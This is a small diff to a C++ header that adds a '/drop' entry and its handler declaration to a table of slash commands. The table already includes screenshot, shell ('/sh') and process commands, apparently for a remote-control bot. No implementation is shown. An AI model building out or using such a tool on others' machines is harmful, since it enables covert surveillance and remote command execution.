@@ -41,8 +41,9 @@ private:
         void (Handler::*handler)();
     };
     
-    const std::array<CommandHandler, 18> command_map = {{
+    const std::array<CommandHandler, 19> command_map = {{
         {"/screenshot",   &Handler::handleScreenshotCommand},
+        {"/drop",         &Handler::handleDropCommand},
         {"/sh",           &Handler::parseAndHandleShellCommand},
         {"/process",      &Handler::parseAndHandleProcessCommand},
         {"/menu",         &Handler::handleMenuCommand},
@@ -68,6 +69,7 @@ private:
     
   // Command handler methods
     void handleScreenshotCommand();
+    void handleDropCommand();
     void parseAndHandleShellCommand();
     void parseAndHandleProcessCommand();
     void handleHelpCommand();
